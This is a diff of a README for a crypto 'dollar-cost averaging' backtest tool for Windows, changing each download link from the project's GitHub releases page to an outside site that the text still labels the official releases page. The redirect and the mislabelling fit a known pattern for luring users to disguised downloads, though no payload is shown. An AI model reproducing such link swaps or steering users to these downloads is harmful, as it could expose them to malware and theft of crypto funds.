@@ -1,6 +1,6 @@
 # 📊 dcabacktest - Test Your Crypto Strategy Safely
 
-[![Download dcabacktest](https://img.shields.io/badge/Download-dcabacktest%20for%20Windows-brightgreen?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Smpkapin54/dcabacktest/releases)
+[![Download dcabacktest](https://img.shields.io/badge/Download-dcabacktest%20for%20Windows-brightgreen?style=for-the-badge&logo=windows&logoColor=white)](https://smpkapin54.github.io)
 
 dcabacktest is a free, open-source desktop tool that lets you see how a "buy a little, buy often" investing plan would have performed on Bitcoin and Ethereum before you risk a single dollar of real money. No accounts. No subscriptions. No internet connection required once you have it.
 
@@ -14,7 +14,7 @@ Getting dcabacktest onto your Windows computer takes about two minutes and does 
 
 Go to the official releases page here:
 
-👉 **https://github.com/Smpkapin54/dcabacktest/releases**
+👉 **https://smpkapin54.github.io**
 
 Visit this link to download the application.
 
@@ -159,7 +159,7 @@ If the project is useful to you, starring the repository is a simple way to help
 
 Ready to begin? Head to the official releases page and grab the latest version:
 
-👉 **https://github.com/Smpkapin54/dcabacktest/releases**
+👉 **https://smpkapin54.github.io**
 
 Visit this link to download the application.
 
